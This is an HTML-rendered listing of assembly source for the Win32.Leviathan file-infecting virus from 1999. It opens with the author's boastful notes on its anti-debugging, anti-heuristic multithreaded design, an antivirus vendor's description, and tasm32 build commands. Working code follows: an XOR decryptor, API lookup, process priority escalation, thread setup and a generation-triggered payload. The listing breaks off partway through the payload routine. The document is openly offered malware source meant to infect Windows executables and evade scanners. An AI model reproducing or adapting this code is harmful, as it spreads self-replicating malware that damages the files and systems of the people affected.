<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Virus.Win32.Levi.3236 - leviathan.asm.html</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">;======================================</span><span class="sc0">
</span><span class="sc1">;|  Win32.Leviathan (c) 1999 by Benny |</span><span class="sc0">
</span><span class="sc1">;======================================</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;Author's description</span><span class="sc0">
</span><span class="sc1">;=====================</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;I'm very proud to introduce my third Win32 virus. This honey is the FIRST MULTITHREADED</span><span class="sc0">
</span><span class="sc1">;semi-polymorphic antidebuggin' antiheuristic Win32 infector. Thats not all. This is also</span><span class="sc0">
</span><span class="sc1">;first virus simulatin' NEURAL NETS. Each neuron is simulated as one thread.</span><span class="sc0">
</span><span class="sc1">;Dendrits (more inputs) and Axons (one output) r coded as normal function parameters.</span><span class="sc0">
</span><span class="sc1">;Synapses ("conectors" linkin' neurons) r represented as single jumps and synchronizin'</span><span class="sc0">
</span><span class="sc1">;stuff. In bio-neurons, memory and ability to learn is in fact nothing other than </span><span class="sc0">
</span><span class="sc1">;swappin' synapses. This virus doesn't contain any learn-abilities, 'cause i've decided,</span><span class="sc0">
</span><span class="sc1">;there's nothing important to learn. Now, tell me, if u wanna have uncompleted virus that</span><span class="sc0">
</span><span class="sc1">;needs to teach step by step every shit, u want to be able to do it. I think, u don't</span><span class="sc0">
</span><span class="sc1">;and I don't want it too. But next version, i will improve it, i swear :-D.</span><span class="sc0">
</span><span class="sc1">;As u can see, this virus is wrote in very short time (ask Super for reason, hehe),</span><span class="sc0">
</span><span class="sc1">;so if u will see any errors, mail me to benny@post.cz. I'm expectin' the most errors</span><span class="sc0">
</span><span class="sc1">;and mistypes will be present in synchronizin' stuff. I know, that method of</span><span class="sc0">
</span><span class="sc1">;synchronizin' of threads is the worst, I could choose, but it has two reasons - debuggers</span><span class="sc0">
</span><span class="sc1">;and heuristic scanners. ALL threads r runnin' on the background, so EVERY heuristic</span><span class="sc0">
</span><span class="sc1">;scanner that wants to detect it MUST support multi-threadin'. That's not easy to code, </span><span class="sc0">
</span><span class="sc1">;so this is the best anti-heuristic, I know. It works well also for debuggers. When u will</span><span class="sc0">
</span><span class="sc1">;step this, u will see only some decryptor, some API calls and "infinite" loop. But all</span><span class="sc0">
</span><span class="sc1">;other stuff is runnin' on the background, so u have to watch all threads. And that's not</span><span class="sc0">
</span><span class="sc1">;all, u have to watch and skip one "anti-debuggin'" thread, if u hate problems</span><span class="sc0">
</span><span class="sc1">;with debuggin' :D. And the last thing: This virus is unoptimized, i know that. It's</span><span class="sc0">
</span><span class="sc1">;simulatin' program written in some HLL language. It uses many instructions, many loops,</span><span class="sc0">
</span><span class="sc1">;many jumps and many variables. Heuristic scanner must have very large stack to handle</span><span class="sc0">
</span><span class="sc1">;this babe... (the biggest problem is speed of infected programs, but who cares...:D)</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;I think, this is the first step of makin' really armoured, anti-debuggin', anti-heuristic</span><span class="sc0">
</span><span class="sc1">;and (the most important thing) "inteligent" viruses.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;Payload</span><span class="sc0">
</span><span class="sc1">;--------</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;If the virus has done at least 30 generation, u will see dialog box with some</span><span class="sc0">
</span><span class="sc1">;comments.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;AVP's description</span><span class="sc0">
</span><span class="sc1">;==================</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;It is not a dangerous nonmemory resident encrypted parasitic Windows32 virus. It searches</span><span class="sc0">
</span><span class="sc1">;for PE EXE files (Windows executable files) in the current directory, then writes itself</span><span class="sc0">
</span><span class="sc1">;to the end of the file. While infecting the virus writes itself to the end of last file</span><span class="sc0">
</span><span class="sc1">;section, increases its size and modifies program's startup address. </span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;Starting from the 30th generation the virus displays the message window, they are different in</span><span class="sc0">
</span><span class="sc1">;different virus versions: </span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;Levi.3040</span><span class="sc0">
</span><span class="sc1">;----------</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;Displays the following text: </span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;  Win32.Wildfire (c) 1998 Magnic</span><span class="sc0">
</span><span class="sc1">;  I am/I can - The Wildfire virus.</span><span class="sc0">
</span><span class="sc1">;  -d    e     c     o     d     e-</span><span class="sc0">
</span><span class="sc1">;  idwhereamif73hrjddhffidosyeudifr</span><span class="sc0">
</span><span class="sc1">;  ghfeugenekasperskydjfkdjisfatued</span><span class="sc0">
</span><span class="sc1">;  938rudandmydickisgrowingehdjfggk</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;Levi.3236</span><span class="sc0">
</span><span class="sc1">;----------</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;Displays the following text: </span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;  Hey stupid !</span><span class="sc0">
</span><span class="sc1">;  Win32.Leviathan (c) 1999 by Benny</span><span class="sc0">
</span><span class="sc1">;  This is gonna be your nightmare...</span><span class="sc0">
</span><span class="sc1">;  30th generation of Leviathan is here... beware of me !</span><span class="sc0">
</span><span class="sc1">;  Threads are stripped, ship is sinkin'...</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;  Greetz:  Darkman/29A</span><span class="sc0">
</span><span class="sc1">;           Super/29A</span><span class="sc0">
</span><span class="sc1">;           Billy Belcebu/DDT</span><span class="sc0">
</span><span class="sc1">;           and all other 29Aers...</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;  Special greet:</span><span class="sc0">
</span><span class="sc1">;           Arthur Rimbaud</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;  New milenium is knockin on the door...</span><span class="sc0">
</span><span class="sc1">;  New generation of viruses is here, nothing promised, no regret.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;While infecting the virus runs seven threads from its main procedure. Each thread performs only</span><span class="sc0">
</span><span class="sc1">;limited set of actions and passes control to next thread: one thread checks system conditions</span><span class="sc0">
</span><span class="sc1">;and enables second thread that searches for files, then third thread checks the file structure,</span><span class="sc0">
</span><span class="sc1">;then next thread writes the virus code to the file, e.t.c. </span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;To get access to Windows Kernel32 functions the virus scans victim files for GetModuleHandleA</span><span class="sc0">
</span><span class="sc1">;and GetModuleHandleW imported functions. In case no these exports found, the virus does not</span><span class="sc0">
</span><span class="sc1">;affect the file. Otherwise is stores functions' addresses and uses them in its installation</span><span class="sc0">
</span><span class="sc1">;routine. </span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;Author's notes</span><span class="sc0">
</span><span class="sc1">;===============</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;Bah, as u can see, there r two versions of virus. There is also "a second one" (Win32.Levi.3236).</span><span class="sc0">
</span><span class="sc1">;When I finished this, I sent it to my friends and to every ppl who wanted to see it (binary only</span><span class="sc0">
</span><span class="sc1">;ofcoz). L8r, when I was on IRC, IntelServ (in that time, I didn't know, whata jerk IntelServ is)</span><span class="sc0">
</span><span class="sc1">;changed his nick to "Z0MBie" (in that time nick of one 29Aer) and asked me for source. Yeah,</span><span class="sc0">
</span><span class="sc1">;that time I didn't know that silly "trick", which many lamers used to get sources from someones.</span><span class="sc0">
</span><span class="sc1">;I gave that to him and that was BIG mystake. Well, some lamer modified source and made new</span><span class="sc0">
</span><span class="sc1">;variant of virus. U can see, that new version is smaller and displays another message as payload.</span><span class="sc0">
</span><span class="sc1">;But thing that made me laughin' and cryin' is date of release that variant prints. It prints</span><span class="sc0">
</span><span class="sc1">;"1998" year. That lamer wanted to show ya, that he was the first one who coded it. Many ppl</span><span class="sc0">
</span><span class="sc1">;thought I stolen source code from someone and "improved" that, so I had to explain everyone, I</span><span class="sc0">
</span><span class="sc1">;was the first and that silly version is stolen one. Here u have original source, so I hope u will</span><span class="sc0">
</span><span class="sc1">;believe me. And last note: None of any normal coderz could do that. Only lamerz, only ppl that</span><span class="sc0">
</span><span class="sc1">;can't code anything that would be able to run can do this. Let's say hello to them X-D.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;Greetz</span><span class="sc0">
</span><span class="sc1">;=======</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       Darkman/29A............ Thanx for all</span><span class="sc0">
</span><span class="sc1">;       Super/29A.............. Hey, thanx for motivation... X-D</span><span class="sc0">
</span><span class="sc1">;       IntelServ.............. U lame!</span><span class="sc0">
</span><span class="sc1">;       Magnic/WildFire/Lamer.. Hahaha, gewd. And can u code anything else?</span><span class="sc0">
</span><span class="sc1">;       and all coderz......... Trust noone!</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;Who is this virus dedicated for?</span><span class="sc0">
</span><span class="sc1">;=================================</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;For the best French poetist ever, for Jean-Arthur-Nicolas-Rimbaud.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;How to build</span><span class="sc0">
</span><span class="sc1">;=============</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;   tasm32 -ml -q -m4 levi.asm</span><span class="sc0">
</span><span class="sc1">;   tlink32 -Tpe -c -x -aa -r levi,,, import32</span><span class="sc0">
</span><span class="sc1">;   pewrsec levi.exe</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;Who da fuck is that Leviathan ?</span><span class="sc0">
</span><span class="sc1">;================================</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;Open (un)holy book, stupid !</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;(c) 1999 Benny. Enjoy!</span><span class="sc0">




</span><span class="sc2">.386p</span><span class="sc0">                           </span><span class="sc1">;386 protected instructions</span><span class="sc0">
</span><span class="sc9">.model</span><span class="sc0"> </span><span class="sc10">flat</span><span class="sc0">                     </span><span class="sc1">;32bit offset</span><span class="sc0">

</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">win32api.inc</span><span class="sc0">                    </span><span class="sc1">;some includes</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">pe.inc</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">mz.inc</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">useful.inc</span><span class="sc0">

</span><span class="sc5">REALTIME_PRIORITY_CLASS</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc2">80h</span><span class="sc0">         </span><span class="sc1">;constant for changin priorities</span><span class="sc0">

</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">GetModuleHandleA</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">             </span><span class="sc1">;needed by first generation</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">GetModuleHandleW</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">ExitProcess</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">


</span><span class="sc9">.data</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">                   </span><span class="sc1">;for tlink32's pleasure</span><span class="sc0">
</span><span class="sc9">ends</span><span class="sc0">


</span><span class="sc9">.code</span><span class="sc0">
</span><span class="sc5">Start</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pushad</span><span class="sc0">                      </span><span class="sc1">;push all regs</span><span class="sc0">
</span><span class="sc5">j1</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">nop</span><span class="sc0">             </span><span class="sc1">;here starts decryptorn NOPs r filled with junk bytes</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">j2</span><span class="sc0">                     </span><span class="sc1">;get delta</span><span class="sc0">
</span><span class="sc5">j2</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">nop</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">j3</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">nop</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">j2</span><span class="sc0">
</span><span class="sc5">j4</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">nop</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">encrypted</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">;enrypted stuff start</span><span class="sc0">
</span><span class="sc5">j5</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">nop</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">virus_end</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">encrypted</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">/</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">    </span><span class="sc1">;count</span><span class="sc0">
</span><span class="sc5">j6</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">nop</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                  </span><span class="sc1">;enrypt constant</span><span class="sc0">
</span><span class="sc5">key</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
</span><span class="sc5">j7</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">nop</span><span class="sc0">
</span><span class="sc5">decrypt</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                  </span><span class="sc1">;decrypt 4 bytes</span><span class="sc0">
</span><span class="sc5">j8</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">nop</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">                  </span><span class="sc1">;next 4 bytes</span><span class="sc0">
</span><span class="sc5">j9</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">nop</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">decrypt</span><span class="sc0">                    </span><span class="sc1">;do it ECX times</span><span class="sc0">


</span><span class="sc5">encrypted</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                     </span><span class="sc1">;delta remainder</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">_GetModuleHandleA</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">400000h</span><span class="sc0"> </span><span class="sc1">;first dendrit</span><span class="sc0">
</span><span class="sc5">MyGMHA</span><span class="sc0">  </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">_GetModuleHandleW</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">400000h</span><span class="sc0"> </span><span class="sc1">;second dendrit</span><span class="sc0">
</span><span class="sc5">MyGMHW</span><span class="sc0">  </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Neuron_GMH</span><span class="sc0">                 </span><span class="sc1">;call first pseudo-neuron</span><span class="sc0">
    </span><span class="sc6">jecxz</span><span class="sc0"> </span><span class="sc10">error</span><span class="sc0">                 </span><span class="sc1">;error, jump to host</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">K32Handle</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">          </span><span class="sc1">;store handle</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                   </span><span class="sc1">;first dendrit</span><span class="sc0">

    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">szAPIs</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">;second dendrit</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ddAPIs</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">;third</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Neuron_GPA</span><span class="sc0">                 </span><span class="sc1">;call pseudo-neuron</span><span class="sc0">
    </span><span class="sc6">jecxz</span><span class="sc0"> </span><span class="sc10">error</span><span class="sc0">                 </span><span class="sc1">;error ?</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ddGetCurrentProcess</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">;get pseudo-handle of cur. process</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ddGetPriorityClass</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">;get current process priority</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">REALTIME_PRIORITY_CLASS</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ddSetPriorityClass</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">;set new one</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">jecxz</span><span class="sc0"> </span><span class="sc10">error</span><span class="sc0">                 </span><span class="sc1">;error ?</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Neuron_Init</span><span class="sc0">                </span><span class="sc1">;Init neurons by pseudo-neuron</span><span class="sc0">
    </span><span class="sc6">jecxz</span><span class="sc0"> </span><span class="sc10">error</span><span class="sc0">

</span><span class="sc5">n_loop</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">JumpToHost</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">      </span><span class="sc1">;can i jump to host ?</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">n_loop</span><span class="sc0">                   </span><span class="sc1">;neurons r runnin', wait</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ddSetPriorityClass</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">;set back priority</span><span class="sc0">

    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                    </span><span class="sc1">;check for payload</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">29</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">NumOfExecs</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">;executed for 30x ?</span><span class="sc0">
    </span><span class="sc6">jb</span><span class="sc0"> </span><span class="sc10">error</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">GenerationCount</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">        </span><span class="sc1">;30th generation ?</span><span class="sc0">
    </span><span class="sc6">jb</span><span class="sc0"> </span><span class="sc10">error</span><span class="sc0">
    </span><span class="sc6">in</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">
    </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc0">                  </span><span class="sc1">;check tix</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc10">error</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Neuron_PayLoad</span><span class="sc0">             </span><span class="sc1">;call pseudo-neuron -&gt; payload</span><span class="sc0">

</span><span class="sc10">error</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esp.Pushad_eax</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
    </span><span class="sc6">popad</span><span class="sc0">                       </span><span class="sc1">;recover stack and registers</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">EntryPoint</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">400000h</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                     </span><span class="sc1">;jump to host</span><span class="sc0">

</span><span class="sc1">;----------------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">Neuron_PayLoad</span><span class="sc0">  </span><span class="sc9">Proc</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">payload</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'USER32'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">             </span><span class="sc1">;push this name</span><span class="sc0">
</span><span class="sc5">payload</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ddLoadLibraryA</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">;load USER32.DLL</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">end_payload</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">szMessageBoxA</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GetProcAddress</span><span class="sc0">             </span><span class="sc1">;find API</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">jecxz</span><span class="sc0"> </span><span class="sc5">end_payload</span><span class="sc0">               </span><span class="sc1">;not found, no payload :-(</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">1000h</span><span class="sc0">
